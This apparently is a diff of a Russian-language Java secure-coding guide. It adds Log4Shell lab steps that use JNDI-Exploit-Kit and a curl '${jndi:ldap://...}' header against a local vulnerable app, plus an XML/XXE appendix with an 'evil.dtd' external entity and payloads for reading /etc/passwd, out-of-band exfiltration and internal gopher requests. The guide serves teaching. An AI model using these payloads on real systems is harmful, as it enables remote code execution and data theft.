@@ -1300,43 +1300,20 @@ curl localhost:8080/ -H 'X-Api-version: ${java:version}'
 
 ![cwe-94_4.png](readme_img/cwe-94_4.png)
 
+4. Запустим JNDI-Exploit-Kit (https://github.com/pimps/JNDI-Exploit-Kit):  
+`java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch tmp/pwned1" -A "127.0.0.1"`  
+где “C” – команда, “A” – IP, на котором будут висеть LDAP и RMI сервера.
 
+![cwe-94_5.png](readme_img/cwe-94_5.png)
 
+5. Отправим подготовленный запрос в уязвимое приложение:  
+`curl localhost:8080/ -H 'X-Api-version: ${jndi:ldap://172.17.0.1:1389/ujkli2}'`
+6. Проверяем, выполнилась ли команда:
+`docker exec -it vulnerable-app ls tmp/`
 
-***
-***
+![cwe-94_6.png](readme_img/cwe-94_6.png)
 
-***
-***
-
-
-
-
-# TODO
-
-
-***
-
-***
-
-***
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+7. Profit!
 
 
 #### 4.2.1. Условия для появления уязвимости:
@@ -2778,6 +2755,241 @@ public String isProductExistSafety(@PathVariable String name) {
 3. https://owasp.org/www-community/Improper_Error_Handling
 4. https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.3-Release-Notes#changes-to-the-default-error-pages-content
 5. https://dev.to/abdelrani/error-handling-in-spring-web-using-rfc-9457-specification-5dj1
+
+***
+
+## Приложение 1. Структура и возможности XML
+
+* XML - аббревиатура от англ. eXtensible Markup Language (пер. расширяемый язык разметки).
+* XML – язык разметки, который напоминает HTML.
+* XML предназначен для передачи данных, а не для их отображения.
+* Теги XML не предопределены. Вы должны сами определять нужные теги.
+
+### 1.1. Разница между XML и HTML
+
+XML не является заменой HTML. Они предназначены для решения разных задач: XML решает задачу хранения и транспортировки данных, фокусируясь на том, что такое эти самые данные, HTML же решает задачу отображения данных, фокусируясь на том, как эти данные выглядят. Таким образом, HTML заботится об отображении информации, а XML о транспортировке информации.
+
+### 1.2. Структура XML
+
+- В зависимости от уровня соответствия стандартам документ может быть "верно сформированным" ("well-formed") (может проверяется средой разработки), либо "валидным" ("valid") (проверяется в процессе обработки). Вот несколько основных правил создания верно сформированного документа:
+- Каждый элемент XML должен содержать начальный и конечный тэг (либо пустой тэг типа <TAG />, который может нести информацию посредством своих атрибутов).
+- Любой вложенный элемент должен быть полностью определён внутри элемента, в состав которого он входит.
+- Документ должен иметь только один элемент верхнего уровня.
+- Имена элементов чувствительны к регистру.
+- Валидным (valid) называется корректно сформированный (well-formed) документ, отвечающий двум дополнительным требованиям:
+- Пролог документа может содержать определение типа документа (DTD - Document Type Definition), задающее структуру документа.
+- Оставшаяся часть документа должна отвечать структуре, заданной в DTD.
+
+В XML мы можем определять схему элементов, использовать вложенные элементы данных, извлекать их с помощью синтаксического анализатора XML.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+        <!ELEMENT users (user)+>
+        <!ELEMENT user (id,username,password)>
+        <!ELEMENT id (#PCDATA)>
+        <!ELEMENT username (#PCDATA)>
+        <!ELEMENT password (#PCDATA)>
+        ]>
+<users>
+    <user>
+        <id>1</id>
+        <username>Rahul</username>
+        <password>$%@#!@%xzcv5354</password>
+    </user>
+    <user>
+        <id>2</id>
+        <username>Faraz</username>
+        <password>j@ff@0ck$l</password>
+    </user>
+    <user>
+        <id>3</id>
+        <username>Armaan</username>
+        <password>armaan</password>
+    </user>
+</users>
+```
+
+В приведенном выше XML есть описание DTD, в котором определен тип данных для XML. Полное DTD также может быть определено во внешнем файле. В DTD есть нечто под названием «ENTITIES», которое можно использовать для подстановки текста.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE users [
+        <!ENTITY x "Volodya" >
+        <!-- Here "x" is the entity name which is nothing but the substituion for the string "Volodya" -->
+        ]>
+<users>
+    <user>
+        <id>1</id>
+        <username>&x;</username> <!-- here the entity "x" is a variable storing the value "Volodya"-->
+        <password>!@#$%^&*()1234567890</password>
+    </user>
+</users>
+```
+
+ENTITIES могут использоваться для определения DTD во внешнем файле, который может быть относительным URL или внешним URL. Здесь на помощь приходит XXE (внешние сущности XML). Наличие внешнего DTD позволяет злоумышленнику сделать внешний запрос со стороны сервера, который выполняется с помощью ключевого слова «SYSTEM», за которым следует путь или URL-адрес внешнего файла DTD.
+
+```xml
+<!DOCTYPE users [
+        <!ENTITY x SYSTEM "http://qweqweqwe/evil.dtd" >
+        ]>
+```
+
+Эти объекты можно было использовать только внутри структуры XML. Однако есть нечто, называемое сущностями параметров, которые можно определять или вызывать внутри самого DOCTYPE. Они обозначаются символом «%», за которым следует имя объекта.  
+Источники внедрения XXE - файлы / источники ввода, которые злоумышленник может использовать для внедрения своего вредоносного XML.
+
+* XML
+* PPT(X)
+* XLS(X)
+* PDF
+* ODT
+* DOC(X)
+* SSRF
+* GPX
+* SAML
+* SVG
+* JSON TO XML Modification
+* Feed.RSS
+* XSD (XML Schema Defination)
+* XMP
+* WAP
+* XSLT
+
+Поддерживаемые протоколы:
+1. File: could be used to read local file on the server
+`file:///etc/passwd`
+2. HTTP(s): useful in OOB Data Exfiltration
+`http(s)://securityidiots.com/lol.xml`
+3. FTP: useful in OOB Data Exfiltration & hitting the internal FTP service which is behind NAT
+`ftp://securityidiots.com/lol.xml`
+4. SFTP: hitting the internal SFTP service which is behind NAT
+`sftp://securityidiots.com:11111/`
+5. TFTP: hitting the internal TFTP service which is behind NAT
+`tftp://securityidiots.com:12346/lol.xml`
+6. DICT : could also be used to make requests to internal services
+`dict://ip:22/_XXX`
+`dict://ip:6379/_XXX`
+7. NETDOC: This could be used as an alternative to file in JAVA based Servers.
+`netdoc:/etc/passwd`
+8. LDAP: could be used to query internal LDAP Service.
+`ldap://localhost:11211/%0astats%0aquit`
+9. GOPHER:
+`gopher://<host>:<port>/_<gopher-path>`
+`gopher://<host>:25/%0AHELO ... (executing commands on internal SMTP Service)`
+10. Making internal HTTP Requests(GET,POST..etc):
+`gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A`
+`gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body`
+11. PHP: if PHP is installed we can use PHP Wrappers to read PHP source codes as Base64 content.
+`php://filter/convert.base64-encode/resource=index.php`
+12. Data:
+`data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk`
+
+### 1.3. XML схема
+
+В дополнение к данным, XML-системы обычно используют два дополнительных компонента: схемы и преобразования.  
+Схема – это просто XML-файл, содержащий правила для содержимого XML-файла данных. Файлы схем обычно имеют расширение XSD.  
+Схемы позволяют программам проверять данные. Они формируют структуру данных и обеспечивают их понятность создателю и другим людям. Например, если пользователь вводит недопустимые данные, например текст в поле даты, программа может предложить ему исправить их. Если данные в XML-файле соответствуют правилам в схеме, для их чтения, интерпретации и обработки можно использовать любую программу, поддерживающую XML. Например, javax.xml.validation.Validator может проверять данные <users.xml> на соответствие схеме users.xsd:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<xs:schema attributeFormDefault="unqualified" elementFormDefault="qualified" xmlns:xs="http://www.w3.org/2001/XMLSchema">
+  <xs:element name="users">
+    <xs:complexType>
+      <xs:sequence>
+        <xs:element maxOccurs="unbounded" name="user">
+          <xs:complexType>
+            <xs:sequence>
+              <xs:element name="username" type="xs:string" />
+              <xs:element name="password" type="xs:string" />
+              <xs:element name="group" type="xs:string" />
+              <xs:element name="email" type="xs:string" />
+            </xs:sequence>
+            <xs:attribute name="id" type="xs:positiveInteger" use="required" />
+          </xs:complexType>
+        </xs:element>
+      </xs:sequence>
+    </xs:complexType>
+  </xs:element>
+</xs:schema>
+```
+
+Обратите внимание на следующее:
+
+Строковые элементы в приведенном примере схемы называются объявлениями.  
+Объявления являются мощным средством управления структурой данных. Например, объявление <xsd:sequence> означает, что теги, такие как username, password, group и email должны следовать в указанном выше порядке. С помощью объявлений можно также проверять типы данных, вводимых пользователем. Например, приведенная выше схема требует ввода положительного целого числа для идентификатора пользователя.  
+Если данные в XML-файле соответствуют правилам схемы, то такие данные называют допустимыми. Процесс контроля соответствия XML-файла данных правилам схемы называют (достаточно логично) проверкой. Большим преимуществом использования схем является возможность предотвратить с их помощью повреждение данных. Схемы также облегчают поиск поврежденных данных, поскольку при возникновении такой проблемы обработка XML-файла останавливается.  
+
+### 1.4. Преобразования
+
+XML также позволяет повторно использовать данные. Механизм повторного использования данных называется преобразованием XSLT (или просто преобразованием).  
+Преобразования можно использовать для обмена данными между серверными системами, например между базами данных, или для представления данных в виде html. Так же используется для трансформации XML документов в другие форматы (например, для трансформации XML в HTML).  
+
+### 1.5. Объектная модель  XML-документов (Document Object Model - DOM)
+
+XML имеет древовидную структуру. В самостоятельном XML-документе всегда имеется один корневой элемент (инструкция <?xml version="1.0"?> к дереву элементов отношения не имеет), в котором допустим ряд вложенных элементов, некоторые из которых тоже могут содержать вложенные элементы. Так же могут встречаться текстовые узлы, комментарии и инструкции. Можно считать, что XML-элемент содержит массив вложенных в него элементов и массив атрибутов.  
+У элементов дерева бывают элементы-предки и элементы-потомки (у корневого элемента предков нет, а у тупиковых элементов (листьев дерева) нет потомков). Каждый элемент дерева находится на определённом уровне вложенности (далее — «уровень»). Элементы упорядочены в порядке расположения в тексте XML, и поэтому можно говорить об их предыдущих и следующих элементах. Это очень похоже на организацию каталогов в файловой системе.  
+Класс XML DOM является представлением XML-документа в памяти. Модель DOM позволяет читать, обрабатывать и изменять XML-документ программным образом.  
+Это стандартизованный, структурированный способ представления XML-данных в памяти, хотя на самом деле данные XML хранятся в файлах и пересылаются из других объектов в строковом виде. Далее приведен пример XML-данных.
+
+```xml
+<?xml version="1.0"?>
+<books>
+    <book>
+        <author>Carson</author>
+        <price format="dollar">31.95</price>
+        <pubdate>05/01/2001</pubdate>
+    </book>
+    <pubinfo>
+        <publisher>MSPress</publisher>
+        <state>WA</state>
+    </pubinfo>
+</books> 
+```
+
+При считывании в память создается следующая структура:
+
+![p-1_1.png](readme_img/p-1_1.png)
+
+Каждый круг на этой иллюстрации представляет собой узел в структуре XML-документа, называемый объектом XmlNode.
+
+### 1.6. XPath
+
+XPath – невероятно гибкий, мощный, и простой инструмент для навигации по документам XML. Используется для быстрого поиска запросов к элементам;  
+Строка XPath описывает способ выбора нужных элементов (XmlNode) из массива элементов, которые могут содержать вложенные элементы. Начинается отбор с переданного множества элементов, на каждом шаге пути отбираются элементы, соответствующие выражению шага, и в результате оказывается отобрано подмножество элементов, соответствующих данному пути.  
+Для примера возьмём следующий XHTML документ:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<users>
+    <user id="001">
+        <username>user</username>
+        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
+        <group>Users</group>
+        <email>user@mail</email>
+    </user>
+    <user id="002">
+        <username>admin</username>
+        <password>21232f297a57a5a743894a0e4a801fc3</password>
+        <group>Administrators</group>
+        <email>admin@mail</email>
+    </user>
+</users>
+```
+
+XPath-путь  `//users/user[username/text()=' admin' and password/text()='21232f297a57a5a743894a0e4a801fc3']` будет соответствовать элементу (пользователю) с ID=002.
+
+### 1.7. XQuery
+
+XQuery – язык запросов и функциональный язык программирования, разработанный для обработки данных в формате XML, простого текста, JSON или других предметно-специфичных форматах. XQuery использует XML как свою модель данных. Предназначен для запроса и преобразования коллекций структурированных и неструктурированных данных.  
+Несколько примеров, где используется XQuery:
+1. Выборка информации из баз данных с помощью веб-сервисов
+2. Формирование отчётов на основе данных в XML базах данных
+3. Поиск информации в текстовых документах
+4. Выборка и преобразование данных XML в XHTML формат для публикации в вебе
+5. Сбор данных из нескольких баз данных для интеграционных приложений
+6. Разделение документа XML на несколько частей для выполнения отдельных множественных операций.
+
+
 
 ***
 © Barkhatov Anton
